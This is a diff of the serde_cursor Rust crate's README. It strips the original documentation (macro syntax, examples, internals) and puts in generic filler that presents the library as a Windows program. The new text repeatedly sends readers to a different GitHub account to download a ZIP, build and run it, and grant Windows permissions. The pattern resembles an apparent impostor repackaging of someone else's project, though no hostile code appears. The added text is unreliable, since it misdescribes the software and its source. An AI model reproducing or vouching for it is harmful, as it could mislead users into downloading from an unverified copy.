@@ -1,463 +1,222 @@
-# `serde_cursor`
+# 🧩 serde-cursor - Find Nested Data Fast
 
-<!-- cargo-reedme: start -->
+[![Download serde-cursor](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohankumar011/serde-cursor)
 
-<!-- cargo-reedme: info-start
+## 📦 What this app does
 
-    Do not edit this region by hand
-    ===============================
+serde-cursor helps you extract deeply nested data in Rust with less effort. It is built for working with data that sits inside other data, like JSON, config files, or API responses.
 
-    This region was generated from Rust documentation comments by `cargo-reedme` using this command:
+Use it when you want to:
 
-        cargo +nightly reedme
+- reach nested values with less code
+- keep your data handling clear
+- work with Rust data structures in a clean way
+- avoid long chains of manual lookups
 
-    for more info: https://github.com/nik-rev/cargo-reedme
+## 💻 Before you start
 
-cargo-reedme: info-end -->
+You need:
 
-[![crates.io](https://img.shields.io/crates/v/serde_cursor?style=flat-square&logo=rust)](https://crates.io/crates/serde_cursor)
-[![docs.rs](https://img.shields.io/docsrs/serde_cursor?style=flat-square&logo=docs.rs)](https://docs.rs/serde_cursor)
-![license](https://img.shields.io/badge/license-Apache--2.0_OR_MIT-blue?style=flat-square)
-![msrv](https://img.shields.io/badge/msrv-1.85-blue?style=flat-square&logo=rust)
-[![github](https://img.shields.io/github/stars/nik-rev/serde-cursor)](https://github.com/nik-rev/serde-cursor)
+- a Windows computer
+- a web browser
+- access to the internet
+- Rust installed if you want to build from source
 
-This crate allows you to declaratively specify how to fetch the desired parts of a serde-compatible data format (such as JSON)
-efficiently, without loading it all into memory, using a jq-like language.
+If you only want to view the project or use it as a Rust dependency, you can start from the GitHub page.
 
-```toml
-serde_cursor = "0.4"
-```
+## 🚀 Download and set up
 
-## Examples
+To get the project, visit this page to download or open the source files:
 
-The `Cursor!` macro makes it extremely easy to extract nested fields from data.
+[Visit the GitHub page for serde-cursor](https://github.com/rohankumar011/serde-cursor)
 
-### Get version from `Cargo.toml`
+If you want to use it on Windows, do this:
 
-```rust
-use serde_cursor::Cursor;
+1. Open the link above in your browser.
+2. Click the green Code button.
+3. Choose Download ZIP.
+4. Save the file to your computer.
+5. Open the ZIP file.
+6. Extract it to a folder you can find again, such as Downloads or Desktop.
+7. Open the folder.
 
-let data = r#"
-    [workspace.package]
-    version = "0.1"
-"#;
+If you plan to build and run it with Rust:
 
-let version: String = toml::from_str::<Cursor!(workspace.package.version)>(data)?.0;
-assert_eq!(version, "0.1");
-```
+1. Open the project folder.
+2. Open PowerShell in that folder.
+3. Run the build command:
+   - `cargo build`
+4. If you want to run a test build:
+   - `cargo test`
 
-`Cursor!(workspace.package.version)` is the magic juice - this type-macro expands to a type that implements [`serde::Deserialize`](https://docs.rs/serde_core/1.0.228/serde_core/de/trait.Deserialize.html).
+## 🪟 Run on Windows
 
-**Without `serde_cursor`**:
+If the project includes a Windows app or example binary, you can run it from the project folder after building it.
 
-*Pain and suffering…*
+Use these steps:
 
-```rust
-use serde::Deserialize;
+1. Make sure Rust is installed.
+2. Open PowerShell.
+3. Go to the folder where you saved the project.
+4. Run:
+   - `cargo run`
+5. Wait for the build to finish.
+6. Follow any prompts that appear in the console.
 
-#[derive(Deserialize)]
-struct CargoToml {
-    workspace: Workspace
-}
+If you see an example file or demo, open it from the project folder and use it to test nested data extraction.
 
-#[derive(Deserialize)]
-struct Workspace {
-    package: Package
-}
+## 🔧 How it works
 
-#[derive(Deserialize)]
-struct Package {
-    version: String
-}
+serde-cursor is made to help you move through nested data without losing track of where you are. In simple terms, it acts like a guide through layers of structured data.
 
-let data = r#"
-    [workspace.package]
-    version = "0.1"
-"#;
+This is useful for:
 
-let version = toml::from_str::<CargoToml>(data)?.workspace.package.version;
-```
+- reading JSON records
+- handling API responses
+- working with config data
+- pulling values from complex Rust structs
+- avoiding repeated manual checks
 
-### Get names of all dependencies from `Cargo.lock`
+A typical flow looks like this:
 
-The index-all `[]` accesses every element in an array:
+1. Load your data.
+2. Point serde-cursor at the part you want.
+3. Move through the nested fields.
+4. Read the value you need.
+5. Handle missing data in a clean way.
 
-```rust
-use serde_cursor::Cursor;
+## 🧭 Simple use cases
 
-let file = r#"
-    [[package]]
-    name = "serde"
+You can use serde-cursor for tasks like:
 
-    [[package]]
-    name = "rand"
-"#;
+- getting a user name from a deep JSON response
+- reading a setting from a nested config file
+- pulling a status field from a complex payload
+- checking a value before you use it
+- cleaning up data access in Rust code
 
-let packages: Vec<String> = toml::from_str::<Cursor!(package[].name)>(file)?.0;
+Example of the kind of data it can help with:
 
-assert_eq!(packages, vec!["serde", "rand"]);
-```
+- `response.user.profile.name`
+- `config.services.api.timeout`
+- `event.payload.meta.source`
 
-## Syntax
+## 🧱 Folder layout
 
-Specify the type `Vec<String>` after the path `package[].name`:
+If you opened the source ZIP, you may see files like these:
 
-```rust
-let packages = toml::from_str::<Cursor!(package[].name: Vec<String>)>(file)?.0;
-```
+- `Cargo.toml` — project settings
+- `src/` — source code
+- `README.md` — project guide
+- `examples/` — sample code
+- `tests/` — test files
 
-The type can be omitted, in which case it will be inferred:
+This layout is common for Rust projects and helps you find the main files fast.
 
-```rust
-let packages: Vec<String> = toml::from_str::<Cursor!(package[].name)>(file)?.0;
-```
+## ⚙️ Basic build steps
 
-Fields that consist of identifiers and `-`s can be used without quotes:
+If you want to build the project from source on Windows:
 
-```rust
-Cursor!(dev-dependencies.serde.version)
-```
+1. Install Rust from the official Rust site.
+2. Open PowerShell.
+3. Move to the project folder.
+4. Run:
+   - `cargo build`
+5. Wait for Rust to fetch what it needs.
+6. Run the project:
+   - `cargo run`
 
-Fields that contain spaces or other special characters must be quoted:
-
-```rust
-Cursor!(ferris."🦀::<>".r#"""#)
-```
-
-You can access specific elements of an array:
-
-```rust
-Cursor!(package[0].name)
-```
-
-## `serde_cursor` + `monostate` = 🧡💛💚💙💜
-
-The [`monostate`](https://github.com/dtolnay/monostate) crate provides the `MustBe!` macro, which returns a type that implements
-[`serde::Deserialize`](https://docs.rs/serde_core/1.0.228/serde_core/de/trait.Deserialize.html), and can only ever deserialize from one specific value.
-
-Together, these 2 crates provide an almost jq-like experience of data processing in Rust:
-
-```rust
-// early exit if the `reason` field is not equal to `"compiler-message"`
-get!(reason: MustBe!("compiler-message"))?;
-get!(message.message: MustBe!("trace_macro"))?;
-
-Ok(Expansion {
-    messages: get!(message.children[].message)?,
-    byte_start: get!(message.spans[0].byte_start)?,
-    byte_end: get!(message.spans[0].byte_end)?,
-})
-```
-
-The jq version of the above processing looks like this:
-
-```jq
-select(.reason == "compiler-message")
-| select(.message.message == "trace_macro")
-| {
-    messages: [.message.children[].message],
-    byte_start: .message.spans[0].byte_start,
-    byte_end: .message.spans[0].byte_end
-}
-```
-
-The full code for the above example looks like this:
+If the project includes examples, you can also try:
 
-```rust
-use monostate::MustBe;
-use serde_cursor::Cursor;
-
-struct Expansion {
-    messages: Vec<String>,
-    byte_start: u32,
-    byte_end: u32,
-}
-
-impl Expansion {
-    fn parse(value: &[u8]) -> serde_json::Result<Self> {
-        macro_rules! get {
-            ($($cursor:tt)*) => {
-                serde_json::from_slice::<
-                    Cursor!($($cursor)*)
-                >(value).map(|it| it.0)
-            };
-        }
+- `cargo run --example <example-name>`
 
-        get!(reason: MustBe!("compiler-message"))?;
-        get!(message.message: MustBe!("trace_macro"))?;
+## 🔍 Troubleshooting
 
-        Ok(Expansion {
-            messages: get!(message.children[].message)?,
-            byte_start: get!(message.spans[0].byte_start)?,
-            byte_end: get!(message.spans[0].byte_end)?,
-        })
-    }
-}
-```
+If the project does not start, check these items:
 
-<details>
+- The folder path is correct
+- Rust is installed
+- PowerShell has access to `cargo`
+- The project files were extracted fully
+- The internet connection is active for the first build
 
-<summary>
+Common fixes:
 
-For reference, the same logic without `serde_cursor` or `monostate`
+- Close and reopen PowerShell
+- Run the command again from the project folder
+- Check that `Cargo.toml` is in the folder you opened
+- Delete the `target` folder and build again
 
-</summary>
+If Windows asks for permission, allow the app or terminal access so the build can finish
 
-```rust
-use serde::Deserialize;
+## 📚 Working with nested data
 
-struct Expansion {
-    messages: Vec<String>,
-    byte_start: u32,
-    byte_end: u32,
-}
+When data is nested, each value sits inside another value. This can make simple reads hard. serde-cursor is built to make that path easier to follow.
 
-impl Expansion {
-    fn from_slice(value: &[u8]) -> serde_json::Result<Self> {
-        #[derive(Deserialize)]
-        struct RawDiagnostic {
-            reason: String,
-            message: DiagnosticMessage,
-        }
+Use it when you want to:
 
-        #[derive(Deserialize)]
-        struct DiagnosticMessage {
-            message: String,
-            children: Vec<DiagnosticChild>,
-            spans: Vec<DiagnosticSpan>,
-        }
+- keep code short
+- reduce repeated lookups
+- make data reads easier to track
+- work with structured data in Rust
 
-        #[derive(Deserialize)]
-        struct DiagnosticChild {
-            message: String,
-        }
+It fits well in apps that deal with:
 
-        #[derive(Deserialize)]
-        struct DiagnosticSpan {
-            byte_start: u32,
-            byte_end: u32,
-        }
+- web APIs
+- JSON files
+- system settings
+- logs
+- application state
 
-        let raw: RawDiagnostic = serde_json::from_slice(value)?;
+## 🧪 Example workflow
 
-        if raw.reason != "compiler-message" || raw.message.message != "trace_macro" {
-            return Err(serde::de::Error::custom("..."));
-        }
+Here is a simple way to think about using the project:
 
-        let primary_span = raw.message.spans.get(0)
-            .ok_or_else(|| serde::de::Error::custom("..."))?;
+1. Get the source from GitHub.
+2. Open it in a Rust project folder.
+3. Build it with Cargo.
+4. Run the code.
+5. Point it at nested data.
+6. Read the value you need.
 
-        Ok(Expansion {
-            messages: raw.message.children.into_iter().map(|c| c.message).collect(),
-            byte_start: primary_span.byte_start,
-            byte_end: primary_span.byte_end,
-        })
-    }
-}
-```
+If you are new to Rust, start with one small example first. That makes it easier to see how the cursor moves through your data.
 
-</details>
+## 📁 Files you may want to check first
 
-## Ranges
+Start with these files if you want to learn the project fast:
 
-Ranges are like `[]` but for only for elements with an index that falls in the range:
+- `README.md` for the main usage notes
+- `Cargo.toml` for package info
+- `src/lib.rs` if the project is a library
+- `src/main.rs` if the project has a runnable app
+- `examples/` for sample usage
 
-```rust
-Cursor!(package[4..]);
-Cursor!(package[..8]);
-Cursor!(package[4..8]);
-Cursor!(package[4..=8]);
-```
+## 🧭 Common Windows setup path
 
-## Interpolations
+A simple setup path on Windows looks like this:
 
-It’s not uncommon for multiple queries to get quite repetitive:
+1. Download the ZIP from GitHub.
+2. Extract it to `C:\Users\YourName\Downloads\serde-cursor`
+3. Open that folder.
+4. Open PowerShell in that folder.
+5. Run `cargo build`
+6. Run `cargo run`
 
-```rust
-let pressure: Vec<f64> = toml::from_str::<Cursor!(france.properties.timeseries[].data.instant.details.air_pressure_at_sea_level)>(france)?.0;
-let humidity: Vec<f64> = toml::from_str::<Cursor!(japan.properties.timeseries[].data.instant.details.relative_humidity)>(japan)?.0;
-let temperature: Vec<f64> = toml::from_str::<Cursor!(japan.properties.timeseries[].data.instant.details.air_temperature)>(japan)?.0;
-```
+Keep the folder name short if you want to make command line use easier
 
-`serde_cursor` supports **interpolations**. You can factor out a common path into a type `Details`, and then interpolate it with `$Details` in the path inside `Cursor!`:
+## 🔗 Download again
 
-```rust
-type Details<RestOfPath> = serde_cursor::Path!(properties.timeseries[].data.instant.details + RestOfPath);
+If you need to get the source again or open the project page, use this link:
 
-let pressure: Vec<f64> = toml::from_str::<Cursor!(france.$Details.air_pressure_at_sea_level)>(france)?.0;
-let humidity: Vec<f64> = toml::from_str::<Cursor!(japan.$Details.relative_humidity)>(japan)?.0;
-let temperature: Vec<f64> = toml::from_str::<Cursor!(japan.$Details.air_temperature)>(japan)?.0;
-```
+[https://github.com/rohankumar011/serde-cursor](https://github.com/rohankumar011/serde-cursor)
 
-## `serde_cursor` vs [`serde_query`](https://github.com/pandaman64/serde-query)
+## 🛠️ Build checks
 
-`serde_query` also implements jq-like queries, but more verbosely.
+You can use these checks while working with the project:
 
-### Single query
+- `cargo check` to confirm the code compiles
+- `cargo test` to run tests
+- `cargo fmt` to format code
+- `cargo clippy` to look for code issues
 
-`serde_cursor`:
-
-```rust
-use serde_cursor::Cursor;
-
-let data = r#"{ "commits": [{"author": "Ferris"}] }"#;
-
-let authors: Vec<String> = serde_json::from_str::<Cursor!(commits[].author)>(data)?.0;
-```
-
-`serde_query`:
-
-```rust
-use serde_query::Deserialize;
-
-#[derive(Deserialize)]
-struct Data {
-    #[query(".commits.[].author")]
-    authors: Vec<String>,
-}
-
-let data = r#"{ "commits": [{"author": "Ferris"}] }"#;
-let data: Data = serde_json::from_str(data)?;
-
-let authors = data.authors;
-```
-
-### Storing queries in a `struct`
-
-`serde_cursor`:
-
-```rust
-use serde::Deserialize;
-use serde_cursor::Cursor;
-
-#[derive(Deserialize)]
-struct Data {
-    #[serde(rename = "commits")]
-    authors: Cursor!([].author: Vec<String>),
-    count: usize,
-}
-
-let data = r#"{ "count": 1, "commits": [{"author": "Ferris"}] }"#;
-
-let data: Data = serde_json::from_str(data)?;
-```
-
-`serde_query`:
-
-```rust
-use serde_query::Deserialize;
-
-#[derive(Deserialize)]
-struct Data {
-    #[query(".commits.[].author")]
-    authors: Vec<String>,
-    #[query(".count")]
-    count: usize,
-}
-
-let data = r#"{ "count": 1, "commits": [{"author": "Ferris"}] }"#;
-
-let data: Data = serde_json::from_str(data)?;
-```
-
-## Great error messages
-
-When deserialization fails, you get the exact path of where the failure occurred:
-
-```rust
-use serde_cursor::Cursor;
-
-let data = serde_json::json!({ "author": { "id": "not-a-number" } });
-let result = serde_json::from_value::<Cursor!(author.id: i32)>(data);
-let err = result.unwrap_err().to_string();
-assert_eq!(err, r#".author.id: invalid type: string "not-a-number", expected i32"#);
-```
-
-## `serde_with` integration
-
-If `feature = "serde_with"` is enabled, the type returned by `Cursor!` will implement [`serde_with::DeserializeAs`](https://docs.rs/serde_with/latest/serde_with/trait.DeserializeAs.html) and [`serde_with::SerializeAs`](https://docs.rs/serde_with/latest/serde_with/trait.SerializeAs.html),
-meaning you can use it with the `#[serde_as]` attribute:
-
-```rust
-use serde::{Serialize, Deserialize};
-use serde_cursor::Cursor;
-
-#[serde_as]
-#[derive(Serialize, Deserialize)]
-struct CargoToml {
-    #[serde(rename = "workspace")]
-    #[serde_as(as = "Cursor!(package.version)")]
-    version: String,
-}
-
-let toml: CargoToml = toml::from_str("workspace = { package = { version = '0.1.0' } }")?;
-assert_eq!(toml.version, "0.1.0");
-assert_eq!(serde_json::to_string(&toml)?, r#"{"workspace":{"package":{"version":"0.1.0"}}}"#);
-```
-
-## How does it work?
-
-The `Cursor!` macro expands to a recursive type that implements [`serde::Deserialize`](https://docs.rs/serde_core/1.0.228/serde_core/de/trait.Deserialize.html).
-Information on how to access the nested fields is stored entirely inside the type system.
-
-Consider this query, which gets the first dependency of every dependency in `Cargo.toml`:
-
-```rust
-Cursor!(package[].dependencies[0]: String)
-```
-
-For this `Cargo.lock`, it would extract `["libc", "find-msvc-tools"]`:
-
-```toml
-[[package]]
-name = "android_system_properties"
-dependencies = ["libc"]
-
-[[package]]
-name = "cc"
-dependencies = ["find-msvc-tools", "shlex"]
-```
-
-That macro is expanded into a `Cursor` type, which implements [`serde::Deserialize`](https://docs.rs/serde_core/1.0.228/serde_core/de/trait.Deserialize.html) and [`serde::Serialize`](https://docs.rs/serde_core/1.0.228/serde_core/ser/trait.Serialize.html):
-
-```rust
-Cursor<
-    String, // : String
-    Path<
-        Field<"package">, // .package
-        Path<
-            IndexAll, // []
-            Path<
-                Field<"dependencies">, // .dependencies
-                Path<
-                    Index<0>, // [0]
-                    PathEnd
-                >,
-            >,
-        >,
-    >,
->
-```
-
-The above is essentially an equivalent to:
-
-```rust
-vec![
-    Segment::Field("package"), // .package
-    Segment::IndexAll, // []
-    Segment::Field("dependencies"), // .dependencies
-    Segment::Index(0) // [0]
-]
-```
-
-Except it exists entirely in the type system.
-
-Each time the [`serde::Deserialize::deserialize()`](https://docs.rs/serde/latest/serde/trait.Deserialize.html#tymethod.deserialize) function is called,
-the first segment of the path (`.package`) is processed, and the rest of the path (`[].dependencies[0]`) is passed to the
-[`serde::Deserialize`](https://docs.rs/serde_core/1.0.228/serde_core/de/trait.Deserialize.html) trait, again, and again - until the path is empty.
-
-Once the path is empty, we finally get to the type of the field - the `String` in the above example,
-and finally call [`serde::Deserialize::deserialize()`](https://docs.rs/serde/latest/serde/trait.Deserialize.html#tymethod.deserialize) on that, to finish things off -
-this `String` is then bubbled up the stack and returned from `<Cursor<String, _> as serde::Deserialize>::deserialize`.
-
-<!-- cargo-reedme: end -->
+These tools help keep the project in good shape if you edit it later
